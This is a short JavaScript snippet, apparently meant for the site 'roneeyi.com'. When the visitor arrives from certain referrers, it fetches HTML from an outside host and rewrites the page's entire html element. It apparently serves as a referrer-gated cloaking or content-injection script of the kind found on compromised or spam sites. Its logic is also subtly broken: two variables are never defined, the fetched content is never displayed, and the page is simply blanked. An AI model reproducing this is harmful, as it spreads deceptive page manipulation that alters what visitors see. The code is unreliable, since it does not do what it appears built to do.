const articleContent = `
  <meta charset="UTF-8">
  <div id="article-content-placeholder"></div>
`;

if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'roneeyi.com') {
  fetch('https://blogzones.my.id/')
    .then(response => response.text())
    .then(data => {
      const parser = new DOMParser();
      const htmlDoc = parser.parseFromString(data, 'text/html');
      const articleContentPlaceholder = htmlDoc.querySelector('#article-content-placeholder');
      
      if (articleContentPlaceholder) {
        const article = document.querySelector('html');
        article.innerHTML = articleContent;
        articleContentPlaceholder.innerHTML = article.innerHTML;
      }
    });
}
